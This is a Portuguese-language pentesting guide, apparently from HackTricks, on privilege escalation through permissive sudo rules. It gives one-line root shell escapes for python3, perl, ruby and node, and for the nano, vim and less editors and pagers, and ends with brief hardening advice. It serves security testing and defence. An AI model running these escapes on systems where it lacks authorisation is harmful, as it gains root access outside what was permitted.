# Abuso de comandos Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpretadores permitidos pelo Sudo

Se `sudo -l` permitir que um usuário execute um interpretador como root, trate isso como execução direta de código. Os interpretadores são projetados para executar código arbitrário, portanto, uma regra que permita `python3`, `perl`, `ruby`, `lua`, `node` ou binários semelhantes geralmente equivale à execução de comandos como root, a menos que os argumentos sejam rigorosamente restritos e validados.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Fluxo comum de revisão: primeiro liste os privilégios do usuário e, em seguida, execute uma instrução Python com a opção `-c` do interpretador.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Outros exemplos de interpretadores são mostrados abaixo; os interpretadores listados documentam a execução de código inline ou APIs de processos filhos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
O caminho exato é importante. Se a regra do sudo permitir `/usr/bin/python3`, use esse caminho exato durante a validação.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editores permitidos pelo Sudo

Se `sudo -l` permitir que um usuário execute um editor interativo como root, trate isso como uma superfície de execução de comandos, não como uma permissão inofensiva para editar arquivos. Os editores geralmente podem executar comandos shell, ler arquivos arbitrários, gravar arquivos arbitrários ou invocar helpers externos de dentro do editor.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Fluxo de revisão comum: liste os privilégios do usuário e, em seguida, invoque cada editor ou pager permitido usando sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Execução de comandos com Nano

Quando `nano` é permitido por meio do sudo, a execução de comandos pode ser acessível pela interface do editor.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Em seguida, forneça um comando como `id` ou `/bin/sh` no prompt de comando do nano.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Se um shell interativo não tiver fluxos de terminal utilizáveis, esta forma de redirecionamento mapeia sua saída padrão e seu erro para o descritor 0.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
A sequência exata de teclas pode variar conforme a versão do nano e as opções de compilação, mas o problema de segurança é o mesmo: o editor está sendo executado como root e pode invocar comandos externos.<sup>[[1]](#references)[[12]](#references)</sup>

### Outras escapes comuns de editores

Editores no estilo Vim geralmente permitem a execução de comandos por meio de `:!`.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
Paginadores como `less` também podem expor a execução de shell.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Notas defensivas

- Evite conceder interpreters ou editores interativos por meio do sudo.<sup>[[1]](#references)</sup>
- Prefira wrappers fixos, de propriedade do root, que executem uma única ação administrativa específica.<sup>[[1]](#references)[[2]](#references)</sup>
- Se um interpreter for inevitável, restrinja o caminho exato do script e impeça argumentos controlados pelo usuário, imports graváveis, `PYTHONPATH` e a preservação insegura do ambiente.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Se a edição de arquivos for necessária, restrinja o caminho exato do arquivo e considere o uso de `sudoedit` com versões corrigidas do sudo e gerenciamento rigoroso do ambiente.<sup>[[1]](#references)[[2]](#references)</sup>
- Analise `SETENV`, `env_keep`, diretórios de trabalho graváveis, caminhos de módulos/imports graváveis, `NOEXEC`, `use_pty` e logging, mas não os trate como um sandbox completo.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — página do manual do Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Linha de comando e ambiente — documentação do Python](https://docs.python.org/3/using/cmdline.html)
- [4] [os — interfaces diversas do sistema operacional — documentação do Python](https://docs.python.org/3/library/os.html)
- [5] [perlrun — como executar o interpreter Perl](https://perldoc.perl.org/perlrun)
- [6] [exec — documentação do Perl](https://perldoc.perl.org/functions/exec)
- [7] [Opções de linha de comando do Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — documentação do Ruby](https://ruby-doc.org/3.4/Kernel.html)
- [9] [API de linha de comando — documentação do Node.js](https://nodejs.org/api/cli.html)
- [10] [Processo filho — documentação do Node.js](https://nodejs.org/api/child_process.html)
- [11] [Página do manual do lua do Lua 5.4](https://www.lua.org/manual/5.4/lua.html)
- [12] [O editor de texto GNU nano](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — página do manual do Linux](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirecionamentos — manual de referência do Bash](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
